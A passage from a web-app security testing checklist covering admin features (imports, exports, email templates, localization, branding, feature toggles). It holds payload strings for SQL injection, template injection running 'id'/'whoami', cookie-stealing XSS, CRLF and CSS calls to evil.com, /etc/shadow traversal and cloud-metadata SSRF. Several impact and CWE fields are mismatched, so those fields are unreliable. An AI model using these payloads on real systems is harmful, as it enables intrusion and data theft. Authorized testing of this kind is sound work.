**Test Steps:** 1. Export own data. 2. Change tenant_id or scope parameter to export data from other tenants. 3. Check if export includes data beyond authorization. 4. Test with all_data or full_export parameters.

**Expected Result:** Application must enforce strict authorization on export operations preventing cross-tenant data extraction.

**Payload Example:**

```
GET /api/admin/export?tenant_id=TENANT-2001;GET /api/admin/export?scope=all_tenants with single-tenant admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-070 — Export Tool Sensitive Data Inclusion
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. Perform data export. 2. Inspect export file for sensitive fields. 3. Check if export includes password hashes and API keys and payment data. 4. Verify data classification in export.

**Expected Result:** Export tools must exclude sensitive data like password hashes and encryption keys and apply data classification rules to export content.

**Payload Example:**

```
Check export for password_hash;api_secret;encryption_key;full_credit_card;ssn;internal_notes in exported file
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-071 — Import Tool Malicious File Upload
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. Upload malicious files via the import tool. 2. Upload web shells disguised as import files. 3. Test with polyglot files. 4. Upload oversized files. 5. Test with executable content.

**Expected Result:** Application must validate import file content by inspection and scan for malware and enforce file size limits.

**Payload Example:**

```
Upload shell.php.csv;import.xml with XXE;polyglot.xlsx with embedded macros;100GB import file
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;ClamAV;Custom Files

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## ADMIN-072 — Import Tool SQL Injection via Data Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. Create an import file with SQL injection payloads in data fields. 2. Process the import. 3. Check if SQL payloads are executed during import processing. 4. Observe for data leakage or manipulation.

**Expected Result:** Application must use parameterized queries when inserting imported data into the database.

**Payload Example:**

```
CSV row: "' OR 1=1--";"test@test.com";"admin' UNION SELECT password FROM users--"
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-073 — Export Tool Unauthorized Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. Attempt data export as non-admin user. 2. Access export API endpoints. 3. Check if export generates files accessible without authentication. 4. Test for direct file download bypass.

**Expected Result:** Application must restrict export functionality to authorized admin roles and protect generated export files with authentication.

**Payload Example:**

```
GET /api/admin/export with non-admin token;access export file URL without authentication;check for publicly accessible exports
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-074 — Import Data Validation Bypass
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. Import file with invalid or malicious data values. 2. Include values that would fail frontend validation. 3. Import negative amounts and future dates and invalid references. 4. Check server-side validation.

**Expected Result:** Application must perform thorough server-side validation on all imported data identical to or stricter than manual data entry validation.

**Payload Example:**

```
Import CSV with negative_price=-999;invalid_email=not-an-email;date=9999-99-99;quantity=2147483648
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Custom Files

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADMIN-075 — Import Tool Deserialization Vulnerability
**Test Category:** Injection (WSTG-INPV-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. If import processes serialized data check for insecure deserialization. 2. Inject malicious serialized objects. 3. Test with Java and PHP and Python serialization formats. 4. Check for RCE.

**Expected Result:** Application must avoid deserializing untrusted import data and validate all deserialized objects.

**Payload Example:**

```
Include ysoserial payload in Java import;PHPGGC chain in PHP import;malicious pickle in Python import
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial;PHPGGC;Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## ADMIN-076 — SSTI in Email Template Editing
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. Access email template editor. 2. Inject SSTI payloads in template content. 3. Save and trigger the email. 4. Check if template engine evaluates injected expressions. 5. Test for RCE.

**Expected Result:** Application must sandbox template editing and prevent injection of dangerous template constructs that could lead to code execution.

**Payload Example:**

```
template_body={{7*7}};email_content=${Runtime.getRuntime().exec('id')};subject=<%= system('whoami') %>;{{config.__class__.__init__.__globals__}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ADMIN-077 — Unauthorized Email Template Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. As a regular admin attempt to modify email templates. 2. Access template management API. 3. Modify critical templates like password reset and account verification. 4. Check for role-based template access.

**Expected Result:** Application must restrict email template modification to authorized roles and implement version control with approval workflow for template changes.

**Payload Example:**

```
PUT /api/admin/email-templates/password-reset with regular admin credentials;modify verification_email template
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-078 — XSS in Email Template Preview
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. Edit an email template with XSS payload. 2. Use the template preview function. 3. Check if the XSS executes in the admin's browser during preview. 4. Test with different rendering contexts.

**Expected Result:** Application must sanitize template preview rendering and execute previews in a sandboxed context to prevent XSS.

**Payload Example:**

```
template_content=<script>alert(document.cookie)</script>;preview_data=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-079 — Email Template IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. Access own organization's email templates. 2. Change template_id to access another tenant's templates. 3. Enumerate template IDs. 4. Check for cross-tenant template exposure.

**Expected Result:** Application must enforce tenant isolation on email templates and prevent cross-tenant template access.

**Payload Example:**

```
GET /api/admin/email-templates/TMPL-2001 with TENANT-1001 credentials;enumerate TMPL-0001 through TMPL-9999
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-080 — Email Template Header Injection
**Test Category:** Injection (WSTG-INPV-11) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. If templates allow dynamic headers inject CRLF characters. 2. Add unauthorized email headers like Bcc. 3. Test for header injection in From and Reply-To fields.

**Expected Result:** Application must sanitize all dynamic values used in email headers within templates and prevent header injection.

**Payload Example:**

```
template_from=admin@target.com%0d%0aBcc:attacker@evil.com;reply_to=legit@target.com%0d%0aCc:spy@evil.com
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## ADMIN-081 — Email Template SSRF via Image URLs
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. Include image URLs in email templates. 2. Set image source to internal service URLs. 3. Trigger email sending. 4. Check if the email server fetches internal resources.

**Expected Result:** Application must validate all URLs in email templates against allowlists and prevent server-side fetching of internal resources.

**Payload Example:**

```
template_image=http://169.254.169.254/latest/meta-data/;logo_url=http://localhost:8080/admin;image=http://10.0.0.1/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADMIN-082 — Email Template SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. If template variables are populated from database queries test for SQL injection in variable mappings. 2. Inject SQL in template parameter bindings. 3. Check for data leakage in emails.

**Expected Result:** Application must use parameterized queries for all template variable resolution and database interactions.

**Payload Example:**

```
template_variable={{user.name' OR 1=1--}};dynamic_field=SELECT password FROM users;query_param=' UNION SELECT email FROM admin--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-083 — SSTI in Notification Template
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Notification Templates

**Test Steps:** 1. Edit notification templates for push and in-app and SMS notifications. 2. Inject SSTI payloads. 3. Trigger notifications. 4. Check if template engine evaluates injected expressions.

**Expected Result:** Application must sandbox notification template editing and prevent SSTI that could lead to code execution.

**Payload Example:**

```
notification_body={{7*7}};push_content=${T(java.lang.Runtime).getRuntime().exec('id')};sms_template=<%= `whoami` %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ADMIN-084 — Unauthorized Notification Template Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Templates

**Test Steps:** 1. Attempt to view and edit notification templates as non-admin. 2. Access template management API endpoints. 3. Test with different role levels. 4. Check for role-based template access.

**Expected Result:** Application must restrict notification template management to authorized admin roles only.

**Payload Example:**

```
GET /api/admin/notification-templates;PUT /api/admin/notification-templates/NT-1001 with non-admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-085 — XSS in Notification Template Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Notification Templates

**Test Steps:** 1. Edit notification template with XSS payload. 2. Trigger the notification for other users. 3. Check if XSS executes in in-app notification rendering. 4. Test across different notification channels.

**Expected Result:** Application must sanitize notification template content and encode output when rendering notifications in any client context.

**Payload Example:**

```
notification_template=<script>alert(document.cookie)</script>;push_body=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-086 — Notification Template Variable Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Notification Templates

**Test Steps:** 1. If notification templates use variable substitution test for injection in variable names. 2. Inject template syntax in variable values. 3. Test for variable scope escape.

**Expected Result:** Application must validate template variables against a whitelist and prevent variable injection or scope escape in notification templates.

**Payload Example:**

```
variable_name={{constructor.constructor('return process')()}};template_var=${__import__('os').system('id')}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-087 — Notification Template IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Templates

**Test Steps:** 1. Access own notification templates. 2. Change template_id to access another tenant's templates. 3. Enumerate template IDs. 4. Check for cross-tenant template data leakage.

**Expected Result:** Application must enforce tenant isolation on notification templates and prevent cross-tenant access.

**Payload Example:**

```
GET /api/admin/notification-templates/NT-2001 with TENANT-1001 credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-088 — XSS via Localization Strings
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Localization Settings

**Test Steps:** 1. Modify localization strings to include XSS payloads. 2. Change language to use the modified strings. 3. Navigate through the application. 4. Check if XSS executes from translation strings.

**Expected Result:** Application must sanitize all localization strings and encode output when rendering translated text in the application.

**Payload Example:**

```
translation_key_value=<script>alert(document.cookie)</script>;welcome_message=<img src=x onerror=alert(1)>;button_text=<svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-089 — Unauthorized Localization Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Localization Settings

**Test Steps:** 1. Attempt to modify localization settings as non-admin. 2. Access translation management API. 3. Modify default language or add translations. 4. Check role-based access enforcement.

**Expected Result:** Application must restrict localization settings modification to authorized admin roles only.

**Payload Example:**

```
PUT /api/admin/localization/translations with non-admin token;POST /api/admin/localization/languages/add with regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-090 — Localization SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Localization Settings

**Test Steps:** 1. Search or filter localization strings. 2. Inject SQL payloads in search and language and key parameters. 3. Observe for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all localization database operations.

**Payload Example:**

```
GET /api/admin/localization?key=' OR 1=1--;GET /api/admin/translations?lang=en' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-091 — Localization File Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Localization Settings

**Test Steps:** 1. If localization loads language files from file system modify the language parameter. 2. Attempt directory traversal to read arbitrary files. 3. Test with encoded traversal sequences.

**Expected Result:** Application must validate language file paths and restrict to authorized localization file directories only.

**Payload Example:**

```
GET /api/localization?lang=../../../etc/passwd;lang=....//....//etc/shadow;lang=%2e%2e%2f%2e%2e%2f
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ADMIN-092 — Right-to-Left Override Attack via Localization
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Localization Settings

**Test Steps:** 1. Add localization strings containing RTL override characters. 2. Include Unicode bidirectional control characters. 3. Check for visual spoofing in rendered text. 4. Test for filename or URL obfuscation.

**Expected Result:** Application must strip or neutralize Unicode bidirectional control characters in localization strings to prevent visual spoofing.

**Payload Example:**

```
Insert U+202E (RTL Override) in translation strings to reverse displayed text;create visually misleading translations
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Browser

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADMIN-093 — Localization String Format String Vulnerability
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Localization Settings

**Test Steps:** 1. If localization uses format strings inject format specifiers. 2. Test with %s and %x and %n format specifiers. 3. Check for information disclosure or crashes from format string processing.

**Expected Result:** Application must safely handle localization string formatting and prevent format string injection.

**Payload Example:**

```
translation_value=%s%s%s%s%s;message=%x%x%x%x;template=%n%n;greeting=Hello %s {user_controlled}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-094 — XSS via Custom Branding Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. Modify branding elements like logo alt text and company name and footer text and custom CSS. 2. Include XSS payloads. 3. Navigate the application. 4. Check if XSS executes from branding elements.

**Expected Result:** Application must sanitize all branding content and encode output when rendering custom branding elements.

**Payload Example:**

```
company_name=<script>alert(document.cookie)</script>;footer_html=<img src=x onerror=alert(1)>;custom_css=body{background:url(javascript:alert(1))}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-095 — Branding Logo Upload Malicious File
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. Upload a custom logo via branding settings. 2. Upload web shell disguised as image. 3. Upload SVG with embedded JavaScript. 4. Upload oversized files. 5. Check content type validation.

**Expected Result:** Application must validate branding file uploads by content inspection and strip active content from SVGs and restrict file types.

**Payload Example:**

```
Upload shell.php.png;logo.svg with <script>alert(1)</script>;polyglot image with PHP code;10GB image file
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Files

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## ADMIN-096 — Unauthorized Branding Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. Attempt to modify branding settings as non-admin. 2. Access branding API endpoints. 3. Change company logo and colors and domain settings. 4. Check role-based access enforcement.

**Expected Result:** Application must restrict branding modifications to authorized admin roles and log all branding changes.

**Payload Example:**

```
PUT /api/admin/branding with non-admin token;POST /api/admin/branding/logo with regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-097 — Custom CSS Injection
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. If white-labeling supports custom CSS inject malicious CSS. 2. Include CSS expressions and url() with JavaScript. 3. Test for CSS-based data exfiltration. 4. Check for behavior property injection.

**Expected Result:** Application must sanitize custom CSS and restrict to safe CSS properties preventing any CSS-based attack vectors.

**Payload Example:**

```
custom_css=*{background:url('javascript:alert(1)')};css=input[value^="a"]{background:url(https://evil.com/?a)};css=body{-moz-binding:url(evil.xml)}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-098 — Branding SSRF via Custom Logo URL
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. If branding allows specifying a logo URL instead of uploading set URL to internal service. 2. Trigger logo rendering. 3. Check if server fetches the internal resource.

**Expected Result:** Application must validate branding resource URLs against allowlists and prevent server-side fetching of internal resources.

**Payload Example:**

```
logo_url=http://169.254.169.254/latest/meta-data/;favicon_url=http://localhost:8080/admin;banner=http://10.0.0.1/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADMIN-099 — Branding Domain Takeover
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. If white-labeling supports custom domains check for dangling DNS records. 2. Test for subdomain takeover on custom branded domains. 3. Verify SSL certificate coverage.

**Expected Result:** Custom branded domains must have proper DNS configuration with no dangling CNAME records that could enable domain takeover.

**Payload Example:**

```
Check custom branded domains for CNAME to unclaimed services;verify SSL certificate matches custom domain
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** subfinder;subjack;dig;SSL Checker

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-100 — IDOR on Branding Configuration
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. Access own organization's branding configuration. 2. Change tenant_id to access another organization's branding. 3. Modify another tenant's branding settings.

**Expected Result:** Application must enforce tenant isolation on branding configurations and prevent cross-tenant branding access or modification.

**Payload Example:**

```
GET /api/admin/branding?tenant_id=TENANT-2001;PUT /api/admin/branding/BRAND-2001 with TENANT-1001 credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-101 — Unauthorized Feature Toggle Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. As a non-admin attempt to access feature toggle management. 2. Enable disabled premium features. 3. Disable security features via toggles. 4. Check for role-based access enforcement.

**Expected Result:** Application must restrict feature toggle management to authorized admin roles and prevent unauthorized feature activation or deactivation.

**Payload Example:**

```
PUT /api/admin/features/premium-feature with enabled=true using non-admin token;disable security_feature
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-102 — Feature Toggle Bypass via Direct API Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. Identify features controlled by toggles. 2. Access the feature's API endpoint directly while the feature is disabled. 3. Check if backend enforcement exists independent of toggle UI. 4. Test with direct URL access.

**Expected Result:** Application must enforce feature toggles at the API level and not just the UI level preventing direct API access to disabled features.

**Payload Example:**

```
Access POST /api/disabled-feature directly when feature toggle shows disabled;bypass UI-level feature gate via API
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-103 — Feature Toggle Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. Rapidly toggle a feature on and off. 2. Send concurrent feature access requests during toggle transition. 3. Check for inconsistent feature state. 4. Verify atomic toggle changes.

**Expected Result:** Application must implement atomic feature toggle changes with proper locking to prevent inconsistent feature states during transitions.

**Payload Example:**

```
Send concurrent PUT /api/admin/features/toggle and GET /api/features/status during toggle transition
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADMIN-104 — Feature Toggle Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

